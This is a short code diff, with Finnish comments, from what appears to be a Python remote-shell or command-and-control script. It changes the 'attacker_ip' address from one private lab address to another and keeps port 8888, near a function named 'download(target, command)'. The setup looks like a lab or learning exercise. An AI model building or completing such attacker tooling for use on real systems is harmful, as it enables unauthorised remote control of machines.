@@ -25,7 +25,7 @@ def download(target, command):
 #pääfunktio
 def main():
 
-    attacker_ip = '192.168.56.1'
+    attacker_ip = '172.20.16.61' #192.168.83.1 VM
     port        = 8888
     
     #luodaan uusi socket objekti käyttämällä socket-funktiota
